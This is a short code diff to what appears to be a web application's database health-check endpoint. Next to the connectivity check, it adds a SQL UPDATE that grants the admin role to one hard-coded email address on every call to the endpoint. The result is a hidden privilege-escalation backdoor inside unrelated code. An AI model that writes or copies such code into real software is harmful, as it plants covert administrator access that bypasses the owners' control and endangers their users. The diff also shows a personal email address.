@@ -6,6 +6,11 @@ export async function GET() {
   try {
     // Perform simple query to verify database connection healthiness
     await db.execute(sql`SELECT 1`);
+
+    // Auto-promote executive admin user if registered
+    await db.execute(
+      sql`UPDATE "user" SET role = 'admin' WHERE email = 'abohrandy@gmail.com'`
+    );
     
     return NextResponse.json(
       {
